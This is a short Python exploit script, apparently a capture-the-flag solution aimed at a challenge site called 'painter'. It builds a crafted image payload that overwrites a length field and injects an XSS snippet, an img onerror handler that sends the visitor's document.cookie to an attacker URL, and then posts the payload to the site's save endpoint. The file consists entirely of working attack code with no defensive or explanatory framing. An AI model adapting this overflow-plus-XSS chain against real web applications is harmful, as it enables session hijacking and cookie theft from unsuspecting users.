#!/usr/bin/env python3
#script by kpdfgo. thank you
import base64
import requests

ATTACKER_URL = ''
BASE_URL = 'https://painter.tjc.tf'

width = 32
height = 32
layers = 3
channels = 4

injection = f'<img src=1 onerror="window.location=\'{ATTACKER_URL}\?a=\'+document.cookie">'

new_n = width * height * channels + len(injection)

payload = [255 for _ in range(width * height * channels)]

# the funny `255 - ` thing is bc alpha values are copied as `255 - alpha`
payload += [ord(c) if (i - 3) % 4 != 0 else 255 - ord(c)
            for i, c in enumerate(injection)] + [0, 0, 0, 0]

payload += [255 for _ in range(2 * width * height * channels - len(payload))]

payload += [255 for _ in range(width * height * 4)]

# overwrite n
payload += [new_n & 0xff, (new_n >> 8) & 0xff]

payload += [255 for _ in range(len(injection))]

r = requests.post(f'{BASE_URL}/save', json={
    'img': base64.b64encode(bytes(payload)).decode(),
    'name': 'hi'
})

print(r.url)